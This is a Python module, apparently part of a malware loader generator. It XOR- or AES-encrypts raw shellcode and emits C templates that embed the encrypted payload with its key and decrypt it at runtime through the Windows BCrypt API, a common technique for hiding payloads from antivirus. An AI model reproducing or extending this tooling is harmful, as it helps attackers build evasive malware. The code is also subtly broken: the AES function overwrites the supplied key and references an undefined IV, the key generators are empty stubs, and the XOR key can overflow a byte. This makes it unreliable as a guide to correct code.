## Encryption module snippets

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
from modules import encryption

# replaces the braces in snippets so that i dont have to manually go and escape them. All I have to do is make sure anything i want to fomrat in has 2 "{{" and "}}".
def replace_braces(template):
     template = template.replace("{", "{{").replace("}", "}}")
     template = template.replace("{{{{", "{{{").replace("}}}}", "}}}")
     return template

# XOR Snippets:
XOR_DECRYPT = """
unsigned char Shellcode[] = {{{xor_shellcode}}};

SIZE_T sShellcodeSize = sizeof(Shellcode);
BYTE bKey = 0b{xor_key};

void XorByOneKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN BYTE bKey) {{
	for (size_t i = 0; i < sShellcodeSize; i++) {{
		pShellcode[i] = pShellcode[i] ^ (bKey + i);
	}}
}}
"""

AES_DECRYPT = """
// Wrapper function for InstallAesDecryption that make things easier
BOOL SimpleDecryption(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pPlainTextData, OUT DWORD* sPlainTextSize) {

	if (pCipherTextData == NULL || sCipherTextSize == NULL || pKey == NULL || pIv == NULL)
		return FALSE;

	// Intializing the struct
	AES Aes = {
		.pKey          = pKey,
		.pIv           = pIv,
		.pCipherText   = pCipherTextData,
		.dwCipherSize  = sCipherTextSize
	};

	if (!InstallAesDecryption(&Aes)) {
		return FALSE;
	}

	// Saving output
	*pPlainTextData = Aes.pPlainText;
	*sPlainTextSize = Aes.dwPlainSize;

	return TRUE;
}

// The decryption implementation
BOOL InstallAesDecryption(PAES pAes) {

  BOOL                  bSTATE          = TRUE;
  BCRYPT_ALG_HANDLE     hAlgorithm      = NULL;
  BCRYPT_KEY_HANDLE     hKeyHandle      = NULL;

  ULONG                 cbResult        = NULL;
  DWORD                 dwBlockSize     = NULL;
  
  DWORD                 cbKeyObject     = NULL;
  PBYTE                 pbKeyObject     = NULL;

  PBYTE                 pbPlainText     = NULL;
  DWORD                 cbPlainText     = NULL;
  NTSTATUS              STATUS          = NULL;

  // Intializing "hAlgorithm" as AES algorithm Handle
  STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Getting the size of the key object variable pbKeyObject. This is used by the BCryptGenerateSymmetricKey function later
  STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }
  
  // Getting the size of the block used in the encryption. Since this is AES it should be 16 bytes.
  STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }
  
  // Checking if block size is 16 bytes
  if (dwBlockSize != 16) {
    	bSTATE = FALSE; goto _EndOfFunc;
  }
  
  // Allocating memory for the key object 
  pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
  if (pbKeyObject == NULL) {
    	bSTATE = FALSE; goto _EndOfFunc;
  }
  
  // Setting Block Cipher Mode to CBC. This uses a 32 byte key and a 16 byte IV.
  STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptSetProperty Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }
  
  // Generating the key object from the AES key "pAes->pKey". The output will be saved in pbKeyObject of size cbKeyObject 
  STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Running BCryptDecrypt first time with NULL output parameters to retrieve the size of the output buffer which is saved in cbPlainText
  STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptDecrypt[1] Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }
  
  // Allocating enough memory for the output buffer, cbPlainText
  pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);
  if (pbPlainText == NULL) {
    	bSTATE = FALSE; goto _EndOfFunc;
  }
  
  // Running BCryptDecrypt again with pbPlainText as the output buffer
  STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, pbPlainText, cbPlainText, &cbResult, BCRYPT_BLOCK_PADDING);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptDecrypt[2] Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Clean up
_EndOfFunc:
  if (hKeyHandle)
    	BCryptDestroyKey(hKeyHandle);
  if (hAlgorithm)
    	BCryptCloseAlgorithmProvider(hAlgorithm, 0);
  if (pbKeyObject)
    	HeapFree(GetProcessHeap(), 0, pbKeyObject);
  if (pbPlainText != NULL && bSTATE) {
        // if everything went well, we save pbPlainText and cbPlainText
        pAes->pPlainText   = pbPlainText;
        pAes->dwPlainSize  = cbPlainText;
  }
  return bSTATE;

}

// the key printed to the screen
unsigned char pKey[] = {{aes_key}};

// the iv printed to the screen
unsigned char pIv[] = {{aes_iv}};

// the encrypted buffer printed to the screen, which is:
unsigned char CipherText[] = {{aes_shellcode}};

int main() {

	// Defining two variables the output buffer and its respective size which will be used in SimpleDecryption
	PVOID	pPlaintext  = NULL;
	DWORD	dwPlainSize = NULL;

	// Decrypting
	if (!SimpleDecryption(CipherText, sizeof(CipherText), pKey, pIv, &pPlaintext, &dwPlainSize)) {
		return -1;
	}
}
"""

def get_xor_shellcode(shellcode: bytes, key: bytes) -> bytes:
        enc_shellcode = []
        for i in range(len(shellcode)):
            key_int = (int.from_bytes(key, byteorder="big") + i)
            enc_shellcode.append(hex(shellcode[i] ^ key_int))
        return ", ".join(enc_shellcode)

def get_aes_shellcode(shellcode: bytes, key: bytes, iv: bytes) -> bytes:
    key = get_random_bytes(32)
    if iv is None:
        iv = get_random_bytes(16)
    if key is None:
        key = get_random_bytes(32)
    cipher = AES.new(key, AES.MODE_CBC, encryption.iv)
    return cipher.encrypt(pad(shellcode, 16)), key, iv
 
def generate_xor_key() -> str:
    return

def generate_aes_key() -> str:
     return


def get_encryption_method(encryption_method, shellcode, key=None, iv=None):
    if encryption_method == "xor":
        # xor the shellcode so we can then include it in the decryption snippet/final executable.
        xor_shellcode = get_xor_shellcode(shellcode, bytes([int(key, 2)])) # now we can pass xor_shellcode into the decryption snippet.
        return XOR_DECRYPT.format(xor_shellcode=xor_shellcode, xor_key=key)
    elif encryption_method == "aes":
        aes_shellcode, key, iv = get_aes_shellcode(shellcode, key, iv)
        aes_shellcode = ", ".join([hex(byte) for byte in aes_shellcode])
        key = ", ".join([hex(byte) for byte in key])
        iv = ", ".join([hex(byte) for byte in iv])
        return replace_braces(AES_DECRYPT).format(aes_shellcode=aes_shellcode, aes_key=key, aes_iv=iv)






